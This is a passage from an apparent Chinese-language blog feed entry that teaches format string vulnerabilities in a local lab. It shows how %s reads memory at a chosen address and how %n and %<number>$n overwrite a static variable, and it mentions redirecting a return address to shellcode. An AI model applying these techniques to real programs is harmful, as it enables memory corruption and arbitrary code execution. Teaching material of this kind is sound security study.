src="/2019/02/11/基本格式化字符串漏洞原理/14.png" alt=""></p><p>0x41414141这个地址已经成功写入内存，下面只需用%s读取对应位置，就能读取以0x41414141为首地址的字符串。<br>如果用%n就能将0x41414141这个地址指向的值修改，就能造成任意内存的修改，可以将栈中返回地址修改为想要执行的shellcode的首地址等等。</p><h4 id="修改内存"><a href="#修改内存" class="headerlink" title="修改内存"></a>修改内存</h4><p>下面写个修改静态变量的例子<br>例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/15.png" alt=""></p><p>测试前，请先关闭内存地址随机化（PIE），否者b在内存中的地址是不确定的。<br>先运行下，得到b的地址<br><img src="/2019/02/11/基本格式化字符串漏洞原理/16.png" alt=""></p><p>接着确定偏移量<br><img src="/2019/02/11/基本格式化字符串漏洞原理/17.png" alt=""></p><p>这里是第九个参数。<br>接着用shellcode编码将b的地址写入，并查看能否写入成功。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/18.png" alt=""><br>用%n修改其值。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/19.png" alt=""><br>因为%n之前打印了75个字符，所以这里将b的值从0修改为75<br><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。注意在命令行输入字符串参数时，要用 “ \ “将 $ 转义，例如：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/20.png" alt=""></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了。<br>你可以通过控制打印的字符个数来修改b的值，达到几乎任意修改。<br>例如%0xxxxxd，通过打印数字前面补0，进行简化。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。&lt;/p&gt;
&lt;p&gt;再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存
      
    
    </summary>
    
    
      <category term="pwnable" scheme="http://yoursite.com/tags/pwnable/"/>
    
      <category term="fmtstr" scheme="http://yoursite.com/tags/fmtstr/"/>
    
  </entry>
  
</feed>
